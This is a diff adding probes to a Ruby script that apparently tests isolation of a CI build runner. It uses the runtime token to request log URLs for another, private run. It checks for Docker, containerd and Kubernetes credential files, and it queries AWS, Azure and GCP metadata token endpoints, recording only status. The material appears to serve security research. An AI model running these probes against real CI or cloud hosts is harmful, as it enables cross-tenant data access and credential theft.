@@ -369,6 +369,91 @@ rescue StandardError => error
   }
 end
 
+def results_job_logs_url(run_backend_id, job_backend_id, token, base_url)
+  return { "status" => 0, "endpoint_present" => false, "signed_url" => nil } if base_url.empty?
+
+  uri = URI.join(base_url, "/twirp/results.services.receiver.Receiver/GetJobLogsSignedBlobURL")
+  request = Net::HTTP::Post.new(uri)
+  request["Authorization"] = "Bearer #{token}"
+  request["Accept"] = "application/json"
+  request["Content-Type"] = "application/json"
+  request["User-Agent"] = "actions-runner-owned-boundary-control"
+  request.body = JSON.generate(
+    "workflow_run_backend_id" => run_backend_id,
+    "workflow_job_run_backend_id" => job_backend_id
+  )
+  response = http_request(uri, request)
+  parsed = JSON.parse(response["body"])
+  response.merge(
+    "endpoint_present" => true,
+    "signed_url" => parsed["logs_url"],
+    "blob_storage_type" => parsed["blob_storage_type"]
+  )
+rescue JSON::ParserError
+  response.merge("endpoint_present" => true, "signed_url" => nil)
+rescue StandardError => error
+  {
+    "status" => 0,
+    "endpoint_present" => true,
+    "signed_url" => nil,
+    "error_class" => error.class.name
+  }
+end
+
+def sanitized_results_url(response)
+  {
+    "endpoint_present" => response["endpoint_present"],
+    "status" => response["status"],
+    "request_id" => response["request_id"],
+    "signed_upload_url_present" => !response["signed_url"].to_s.empty?,
+    "blob_storage_type" => response["blob_storage_type"],
+    "error_class" => response["error_class"]
+  }
+end
+
+def endpoint_status(uri_string, method: :get, headers: {})
+  uri = URI(uri_string)
+  request = method == :put ? Net::HTTP::Put.new(uri) : Net::HTTP::Get.new(uri)
+  headers.each { |key, value| request[key] = value }
+  response = http_request(uri, request, body_limit: 65_536)
+  {
+    "status" => response["status"],
+    "request_id" => response["request_id"],
+    "response_body_present" => !response["body"].to_s.empty?,
+    "error_class" => response["error_class"]
+  }
+end
+
+def sandbox_boundary_probe
+  {
+    "host_control_sockets" => {
+      "docker_socket_present" => File.socket?("/var/run/docker.sock"),
+      "containerd_socket_present" => File.socket?("/run/containerd/containerd.sock") || File.socket?("/var/run/containerd/containerd.sock"),
+      "kubernetes_service_account_token_present" => File.file?("/var/run/secrets/kubernetes.io/serviceaccount/token"),
+      "kvm_device_present" => File.exist?("/dev/kvm")
+    },
+    "cloud_metadata_status_only" => {
+      "aws_imdsv2_token" => endpoint_status(
+        "http://169.254.169.254/latest/api/token",
+        method: :put,
+        headers: { "X-aws-ec2-metadata-token-ttl-seconds" => "60" }
+      ),
+      "azure_instance_metadata" => endpoint_status(
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        headers: { "Metadata" => "true" }
+      ),
+      "azure_managed_identity_token" => endpoint_status(
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F",
+        headers: { "Metadata" => "true" }
+      ),
+      "gcp_default_service_account_token" => endpoint_status(
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        headers: { "Metadata-Flavor" => "Google" }
+      )
+    }
+  }
+end
+
 github_token = ENV.fetch("JEKYLL_GITHUB_TOKEN", "")
 runtime_token = ENV.fetch("ACTIONS_RUNTIME_TOKEN", "")
 cache_url = ENV.fetch("ACTIONS_CACHE_URL", "")
@@ -385,6 +470,7 @@ if foreign_api["status"] == 200
 end
 
 artifact_results = {}
+results_receiver_results = {}
 unless runtime_token.empty?
   current_run_backend_id, current_job_backend_id = runtime_backend_ids(runtime_token)
   if current_run_backend_id && current_job_backend_id
@@ -415,10 +501,27 @@ unless runtime_token.empty?
       "foreign_private_run_probe_list" => sanitized_artifact_list(foreign_list),
       "foreign_private_run_probe_signed_url" => sanitized_artifact_signed(foreign_signed, FOREIGN_ARTIFACT_CANARY)
     }
+    current_job_logs_url = results_job_logs_url(
+      current_run_backend_id,
+      current_job_backend_id,
+      runtime_token,
+      results_url
+    )
+    foreign_job_logs_url = results_job_logs_url(
+      FOREIGN_ARTIFACT_RUN_BACKEND_ID,
+      FOREIGN_ARTIFACT_JOB_BACKEND_ID,
+      runtime_token,
+      results_url
+    )
+    results_receiver_results = {
+      "current_job_logs_upload_control" => sanitized_results_url(current_job_logs_url),
+      "foreign_private_job_logs_upload_probe" => sanitized_results_url(foreign_job_logs_url)
+    }
   end
 end
 
 oidc_result = oidc_claim_probe(oidc_request_url, oidc_request_token)
+sandbox_result = sandbox_boundary_probe
 
 cache_results = {}
 unless runtime_token.empty?
@@ -458,7 +561,9 @@ result = {
   },
   "cache_service_probes" => cache_results,
   "artifact_service_probes" => artifact_results,
-  "oidc_claim_probe" => oidc_result
+  "results_receiver_probes" => results_receiver_results,
+  "oidc_claim_probe" => oidc_result,
+  "sandbox_boundary_probe" => sandbox_result
 }
 
 workspace = ENV.fetch("GITHUB_WORKSPACE", "/github/workspace")
